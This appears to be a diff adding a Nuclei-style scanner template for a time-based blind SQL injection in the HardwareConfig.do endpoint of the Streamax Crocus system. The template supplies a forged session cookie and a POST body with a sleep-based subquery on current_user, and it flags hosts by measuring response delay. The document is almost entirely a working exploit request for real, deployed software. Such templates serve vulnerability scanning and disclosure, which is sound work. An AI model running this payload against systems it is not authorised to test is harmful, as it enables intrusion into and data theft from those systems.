@@ -1,0 +1,52 @@
+id: poc-yaml-crocus-hardwareconfig-do-sqli
+info:
+  name: 锐明技术 Crocus系统 HardwareConfig.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HardwareConfig.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Code\":202"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/HardwareConfig.do?Action=ReadTask"
+    headers:
+      Cookie: "Saffron.U=VUlEPTEmVU49MQ=="
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "PageIndex=0&PageSize=20&State=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep({{t1}}),1))a)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Code\":200"
+          - "\"Result\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2)"
+          - "duration < to_number(t3)"
